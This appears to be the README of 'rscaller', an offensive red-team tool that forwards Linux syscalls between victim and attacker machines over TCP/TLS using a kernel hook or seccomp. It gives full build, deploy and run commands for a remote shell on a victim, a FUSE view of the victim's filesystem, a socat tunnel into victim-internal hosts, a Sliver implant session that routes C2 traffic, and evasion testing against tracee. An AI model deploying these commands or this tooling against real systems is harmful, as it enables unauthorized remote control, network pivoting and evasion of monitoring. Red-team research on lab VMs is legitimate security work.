# rscaller

Syscall forwarding for red team research. Two modes:

**Mode A (kmod):** Victim syscalls → Attacker execution (transparent intercept via kernel module)
**Mode B (rsc):** Attacker commands → Victim execution (remote shell via seccomp + rscfuse)

## Architecture

### Mode A: Victim → Attacker (kmod-based)

```
 ┌─────────────────────────── victim VM ──────────────────────────────┐
 │  process                                                            │
 │    │  syscall(execve, ...)                                          │
 │    ▼                                                                │
 │  kmod (khook)                                                       │
 │    │  intercept → serialize → ControlBuffer                        │
 │    │                          /proc/rscaller                        │
 │    │                          rsclient → TCP →                      │
 │    │                               │                                │
 └────┼───────────────────────────────┼────────────────────────────────┘
      │                               │
      │  TCP/TLS                      │
      └──────────────────────────────►│  attacker: rsbeacon
                                       │    libc::syscall() → local exec
```

## Quick Start: Attacker → Victim (Mode B)

Deploy from attacker VM to victim VM without kmod:

```bash
# 1. Build container with binaries (on dev host)
docker build -t rsc:latest -f docker/rsc.Dockerfile .

# 2. Extract binaries
docker create --name rsc-tmp rsc:latest
docker cp rsc-tmp:/usr/local/bin/{rsc,rscfuse,rsclient,rsbeacon} /tmp/
docker rm rsc-tmp

# 3. Copy to VMs
scp /tmp/rsbeacon /tmp/rsclient victim-vm:~/      # victim needs beacon
scp /tmp/rsc /tmp/rscfuse /tmp/rsclient attacker-vm:~/  # attacker needs rsc + rscfuse

# 4. On victim VM: start beacon
sudo ~/rsbeacon --listen 0.0.0.0:9999

# 5. On attacker VM: run shell with remote execution
sudo ~/rsc --beacon <victim-ip>:9999 --target victim -- /bin/bash
```

**What you get:**
- `/rsc/victim/` — FUSE mount showing victim's filesystem
- Shell commands execute on victim via syscall forwarding
- Network connections (`connect`, `sendto`) tunnel through victim

**Limitations:**
- No virtual network device appears on attacker — network access works via syscall forwarding only
- `connect()` syscalls from attacker's shell execute on victim, reaching victim's network
- For full network tunnel, use `rsc -- /usr/bin/socat TCP-LISTEN:8080,fork TCP:victim-internal-host:80`

**No kernel module required** — Mode B uses seccomp `SECCOMP_RET_USER_NOTIF` for interception.

---

For a realistic test, run kmod + rsclient on **dev-vm-rscaller** (victim),
rsbeacon on the dev host (or a separate attacker VM), and clone the victim
as **dev-vm-rscaller-victim** for a clean target.

## Repository layout

```
rscaller/
├── rsc/                   attacker-side wrapper (seccomp + rscfuse launcher)
│   └── src/main.rs        CLI: --beacon, --target, mounts rscfuse, runs shell
├── rscfuse/               FUSE filesystem daemon
│   └── src/main.rs        CLI: --beacon, --mount, --name; forwards VFS ops
├── rsbeacon/              syscall executor daemon
│   └── src/
│       ├── main.rs        CLI: --listen, --tls, --tls-cert/key
│       ├── server.rs      TCP / TLS accept loop
│       └── executor.rs    raw libc::syscall() dispatch + blocklist
├── rsclient/              syscall relay daemon
│   └── src/
│       ├── main.rs        CLI: --beacon, --ctl kmod|seccomp, --veth-ip
│       ├── veth.rs        veth pair creation (victim-side network tunnel)
│       ├── kmod.rs        #[repr(C)] mirror of ControlBuffer for mmap
│       └── relay.rs       ring buffer poller, beacon I/O
├── kmod/                  kernel module (khook-based, Mode A only)
├── rscaller-proto/        shared Rust crate (types, codec, transport)
├── docker/
│   └── rsc.Dockerfile     Ubuntu 22.04 + Rust + fuse3 + binaries
└── scripts/
    ├── deploy.sh          rsync + build (kmod-focused)
    └── gen_certs.sh       generate self-signed TLS certs
```

## Prerequisites

**Victim VM:**
- Linux kernel headers matching the running kernel (`linux-headers-$(uname -r)`)
- `gcc`, `make`, `git`
- khook submodule (init'd during `make deploy` or manually via `git submodule update --init lib/khook`)

**Attacker / dev host:**
- Rust stable (`rustup` install)
- `cargo` in `$PATH`
- `openssl` if generating TLS certs

**Evasion testing (`scripts/test_evasion_baseline.sh`):**
- Attacker VM (`dev-vm-rscaller`): `fuse3`, `libfuse3-dev` — required for `rscfuse` mount
- Victim VM (`dev-vm-rscaller-clone`): [`tracee`](https://github.com/aquasecurity/tracee) — auto-downloaded to `/tmp/tracee` if missing
- Enum tools (fetched at runtime): [`lse.sh`](https://github.com/diego-treitos/linux-smart-enumeration) (default, fast) or [`linpeas`](https://github.com/carlospolop/PEASS-ng)

## Build

Default: `make` builds Rust workspace (no kmod). Use `make configure` for kmod setup.

```bash
# Quick build (attacker-side binaries)
make

# Or with Docker (produces portable binaries)
docker build -t rsc:latest -f docker/rsc.Dockerfile .
```

### Kmod build (Mode A only)

```bash
make configure   # Generate headers + build kmod + Rust
make kmod        # Just the kernel module
```

## Deploy

Default remote host is `dev-vm-rscaller` (SSH alias). Override with `REMOTE=<host>`.

```bash
# Install build deps on victim VM
make setup-remote REMOTE=dev-vm-rscaller

# Rsync repo + build kmod + build Rust workspace on victim VM
make deploy REMOTE=dev-vm-rscaller
```

`deploy.sh` excludes `.git/`, `target/`, kmod object files, and `certs/`.
khook is initialized on the remote after sync.

## Run

### Plain TCP (dev)

**Attacker host:**
```bash
./target/release/rsbeacon --listen 0.0.0.0:9999
```

**Victim VM:**
```bash
# Load kmod
cd /home/ubuntu/rscaller/kmod && sudo insmod rscaller.ko

# Start relay (replace with attacker IP)
sudo /home/ubuntu/rscaller/target/release/rsclient \
  --beacon <attacker-ip>:9999 \
  --proc-path /proc/rscaller
```

### TLS (prod)

```bash
# Generate certs (attacker host)
bash scripts/gen_certs.sh certs/

# Beacon
./target/release/rsbeacon --listen 0.0.0.0:9999 \
  --tls --tls-cert certs/server.crt --tls-key certs/server.key

# Relay (victim VM, after deploying certs/ca.crt there)
sudo ./target/release/rsclient \
  --beacon <attacker-ip>:9999 --tls --ca-cert certs/ca.crt
```

## Configurable Make variables

| Variable | Default | Purpose |
|---|---|---|
| `REMOTE` | `dev-vm-rscaller` | SSH target for `deploy` / `test-remote` / `setup-remote` |
| `BEACON_HOST` | `127.0.0.1` | Beacon address used by `test-remote` |
| `BEACON_PORT` | `9999` | Beacon port |

Example: `make deploy REMOTE=my-victim-vm BEACON_HOST=10.0.0.1`

## Test

```bash
# Unit + integration tests (no kmod, no VM)
make test

# Local integration tests: codegen output, beacon roundtrip, codec
make integration-tests

# Full end-to-end: kmod on REMOTE, beacon on localhost
make test-remote REMOTE=dev-vm-rscaller

# TLS roundtrip (generate certs first)
bash scripts/gen_certs.sh certs/
cargo test -p rscaller-proto -- --ignored test_tls_roundtrip
```

`test-remote` starts rsbeacon locally, SSHs to `REMOTE` to load kmod + rsclient,
triggers a `kill(self, 0)` to exercise the intercept path, then checks dmesg.

## Adding forwarded syscalls

1. Add the syscall name to `files/forwarded_syscalls`.
2. Add parameter metadata to `hardcoded_syscall_metadata()` in `tools/codegen/src/codegen.rs`.
3. `make handlers` to regenerate `kmod/handler_wrappers.h` and `kmod/syscalls.c`.
4. `make kmod` to rebuild the module.

Parameter metadata specifies C type (int, char*, void*, …), size, and which argument
index is the buffer argument (used for copying userspace strings into kernel buffers).

## Sliver session test

Topology for a realistic test:

```
dev host (attacker)          dev-vm-rscaller (victim, kmod loaded)
  rsbeacon :9999      ◄────  rsclient → /proc/rscaller
  sliver server       ◄────  sliver implant (running on victim)
```

Clone `dev-vm-rscaller` as `dev-vm-rscaller-victim` to get an identical
snapshot as the actual target. On victim:

```bash
# Load kmod
sudo insmod rscaller.ko

# Point rsclient at attacker's beacon
sudo rsclient --beacon <attacker>:9999

# Drop a Sliver implant and execute it
./sliver-implant  # any execve, open, kill will be forwarded
```

On the attacker side, rsbeacon receives `SyscallRequest { number=59 (execve), args=[...] }`
and executes it locally. The victim process blocks until rsbeacon returns the retval.
The implant's syscalls transparently run on the attacker machine — C2 traffic
appears to originate from the attacker's own process table.

## Protocol

```
wire format: [u32 LE length][bincode-encoded payload]

SyscallRequest  { slot_idx: u64, number: u64, args: [u64; 6] }
SyscallResponse { slot_idx: u64, ret: i64 }
```

`slot_idx` correlates requests with responses and maps back to the kmod ring buffer
slot so the kernel completion fires on the right waiter.

## Blocked syscalls (beacon-side)

`rsbeacon` refuses: `reboot(169)`, `init_module(175)`, `delete_module(176)`,
`pivot_root(155)`, `umount2(166)`. Returns `-EPERM`. Extend `BLOCKED_SYSCALLS` in
`rsbeacon/src/executor.rs`.


## References

https://github.com/PatrickBuhagiar/Remote-File-Memory-Mapping - remote mmap
